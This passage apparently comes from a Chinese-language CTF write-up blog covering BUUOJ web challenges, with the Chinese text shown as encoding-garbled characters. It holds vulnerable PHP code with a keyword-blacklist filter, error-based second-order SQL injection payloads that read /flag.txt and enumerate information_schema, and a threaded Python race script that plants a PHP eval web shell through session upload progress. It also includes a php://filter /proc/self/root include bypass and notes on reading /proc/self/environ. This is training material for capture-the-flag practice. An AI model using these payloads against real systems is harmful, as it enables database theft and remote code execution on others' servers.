</span></span><span class="line"><span class="cl">    <span class="nv">$address</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;address&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$phone</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;phone&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span><span class="nv">$user_name</span><span class="p">)</span> <span class="o">||</span> <span class="nx">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span><span class="nv">$phone</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;no sql inject!&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select * from `user` where `user_name`=&#39;</span><span class="si">{</span><span class="nv">$user_name</span><span class="si">}</span><span class="s2">&#39; and `phone`=&#39;</span><span class="si">{</span><span class="nv">$phone</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$fetch</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$fetch</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="nv">$user_name</span><span class="o">.</span><span class="s2">&#34;Â∑≤Êèê‰∫§ËÆ¢Âçï&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$re</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$re</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">&#34;sss&#34;</span><span class="p">,</span> <span class="nv">$user_name</span><span class="p">,</span> <span class="nv">$address</span><span class="p">,</span> <span class="nv">$phone</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$re</span> <span class="o">=</span> <span class="nv">$re</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$re</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;error&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">print_r</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;ËÆ¢ÂçïÊèê‰∫§ÊàêÂäü&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;‰ø°ÊÅØ‰∏çÂÖ®&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s2">&#34;config.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;user_name&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;address&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;phone&#34;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$pattern</span> <span class="o">=</span> <span class="s1">&#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user_name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;user_name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$address</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;address&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$phone</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;phone&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span><span class="nv">$user_name</span><span class="p">)</span> <span class="o">||</span> <span class="nx">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span><span class="nv">$phone</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;no sql inject!&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select * from `user` where `user_name`=&#39;</span><span class="si">{</span><span class="nv">$user_name</span><span class="si">}</span><span class="s2">&#39; and `phone`=&#39;</span><span class="si">{</span><span class="nv">$phone</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$fetch</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$fetch</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$fetch</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$row</span> <span class="o">=</span> <span class="nv">$fetch</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;update `user` set `address`=&#39;&#34;</span><span class="o">.</span><span class="nv">$address</span><span class="o">.</span><span class="s2">&#34;&#39;, `old_address`=&#39;&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;address&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;&#39; where `user_id`=&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;error&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">print_r</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰∏ÄÁúº‰∫åÊ¨°Ê≥®ÂÖ•,ËøôÈáåÂèØ‰ª•Âú®Âú∞ÂùÄÁöÑÂú∞ÊñπÊ≥®ÂÖ•</p>
<p>Áõ¥Êé•Áî®Êä•ÈîôÊ≥®ÂÖ•ÁöÑÊñπÂºèÊ≥®ÂÖ•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; or updatexml(1,concat(0x7e,(select substr(load_file(&#39;</span><span class="o">/</span><span class="n">flag</span><span class="o">.</span><span class="n">txt</span><span class="s1">&#39;),1,30))),1)#</span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; or updatexml(1,concat(0x7e,(select substr(load_file(&#39;</span><span class="o">/</span><span class="n">flag</span><span class="o">.</span><span class="n">txt</span><span class="s1">&#39;),30,60))),1)#</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊàñËÄÖÊûÑÈÄ†<code>user_id</code>ÁöÑÂΩ¢ÂºèÊù•Ê≥®ÂÖ•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;</span><span class="o">/</span><span class="n">flag</span><span class="o">.</span><span class="n">txt</span><span class="s1">&#39;),1,30)),0x7e),1)#</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰πüÂèØ‰ª•ËøôÊ†∑ËÆ©‰ªñÊä•Èîô</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39;,`user_id`=database()#
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39;,`user_id`=(select(group_concat(schema_name))from(information_schema.schemata))#
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="s1">&#39;,`user_id`=(select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;</span><span class="n">ctftraining</span><span class="s1">&#39;))#
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="s1">&#39;,`user_id`=(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;</span><span class="n">FLAG_TABLE</span><span class="s1">&#39;))#
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="s1">&#39;,`user_id`=(select FLAG_COLUMN from ctftraining.FLAG_TABLE limit
</span></span></span><span class="line"><span class="cl"><span class="s1">0,1)#
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÊü•Âá∫Êù•Á©∫ÁöÑÔºåÊâÄ‰ª•Âè™ËÉΩÁî®‰∏äÈù¢ÁöÑÂäûÊ≥ï</p>
<h2 id="wmctf2020make-php-great-again">[WMCTF2020]Make PHP Great Again
</h2><p>ËøôÈ¢òÁî®sessionÂåÖÂê´ÂèØ‰ª•Ëß£ÂÜ≥ÊòØÈùûÈ¢ÑÊúü</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">io</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="cl"><span class="n">sessid</span> <span class="o">=</span> <span class="s1">&#39;bbbbbbb&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;cmd&#34;</span><span class="p">:</span><span class="s2">&#34;system(&#39;cat flag.php&#39;);&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span> <span class="s1">&#39;http://b0634b8b-ad08-4453-9292-3efff2a49706.node5.buuoj.cn:81/&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span><span class="p">:</span> <span class="s1">&#39;&lt;?php eval($_POST[&#34;cmd&#34;]);?&gt;&#39;</span><span class="p">},</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;1.txt&#39;</span><span class="p">,</span><span class="n">f</span><span class="p">)},</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="n">sessid</span><span class="p">}</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://b0634b8b-ad08-4453-9292-3efff2a49706.node5.buuoj.cn:81/?file=/tmp/sess_&#39;</span><span class="o">+</span><span class="n">sessid</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;1.txt&#39;</span> <span class="ow">in</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">event</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+++++++++++++]retry&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">event</span><span class="o">=</span><span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">30</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">write</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">30</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">read</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>È¢ÑÊúüËß£ÊòØË¶ÅÁî®Âà∞require_onceÂåÖÂê´ÁöÑËΩØÈìæÊé•Â±ÇÊï∞ËæÉÂ§öÊó∂onceÁöÑhashÂåπÈÖç‰ºöÁõ¥Êé•Â§±ÊïàÈÄ†ÊàêÈáçÂ§çÂåÖÂê´</p>
<p>[phpÊ∫êÁ†ÅÂàÜÊûê require_once ÁªïËøá‰∏çËÉΩÈáçÂ§çÂåÖÂê´Êñá‰ª∂ÁöÑÈôêÂà∂][https://www.anquanke.com/post/id/213235]</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="n">filter</span><span class="o">/</span><span class="nb">convert</span><span class="o">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">flag</span><span class="o">.</span><span class="n">php</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ÁΩëÈºéÊùØ-2020-ÁôΩËôéÁªÑpicdown">[ÁΩëÈºéÊùØ 2020 ÁôΩËôéÁªÑ]PicDown
</h2><p>ÈùûÈ¢ÑÊúü</p>
<p>Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñ</p>
<p>Áõ¥Êé•ËØª/flag</p>
<p>È¢ÑÊúü</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ËØªÂèñ
</span></span><span class="line"><span class="cl">/proc/self/environ
</span></span><span class="line"><span class="cl">/proc/self/cmdline    
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êúâ‰∏™app.py</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">Response</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">render_template</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">request</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SECRET_FILE</span> <span class="o">=</span> <span class="s2">&#34;/tmp/secret.txt&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">SECRET_FILE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">SECRET_KEY</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">SECRET_FILE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;search.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/page&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">page</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;url&#34;</span><span class="p">)</span>
